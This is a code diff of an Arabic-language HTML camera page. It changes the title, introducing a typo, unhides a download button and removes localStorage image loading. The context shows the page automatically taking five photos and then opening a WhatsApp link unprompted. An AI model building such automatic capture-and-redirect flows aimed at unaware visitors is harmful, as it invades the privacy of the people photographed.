@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>صفحة الكاميرا</title>
+    <title>صفحة الكمكاميرا</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -75,18 +75,13 @@
 </div>
 
 <div id="imagesSection" class="hidden">
-    <button id="downloadButton" class="download-button hidden" onclick="downloadArchive()">تحميل الأرشيف</button>
+    <button id="downloadButton" class="download-button" onclick="downloadArchive()">تحميل الأرشيف</button>
     <button class="exit-button" onclick="exitPage()">الخروج</button>
 </div>
 
 <script>
     let videoStream;
     let captureCount = 0; // عداد لعدد الصور الملتقطة
-
-    // التحقق من الصور المحفوظة
-    if (localStorage.getItem('images')) {
-        images = JSON.parse(localStorage.getItem('images'));
-    }
 
     // فتح الكاميرا
     function startCamera() {
@@ -124,7 +119,6 @@
                     if (captureCount >= 5) {
                         stopCamera(); // إيقاف الكاميرا بعد التقاط 5 صور
                         document.getElementById('message').classList.remove('hidden'); // إظهار الرسالة
-                        document.getElementById('downloadButton').classList.remove('hidden'); // إظهار زر التحميل
                         openWhatsAppLink(); // فتح رابط WhatsApp تلقائيًا
                     } else {
                         captureImage(); // الاستمرار في التقاط الصور
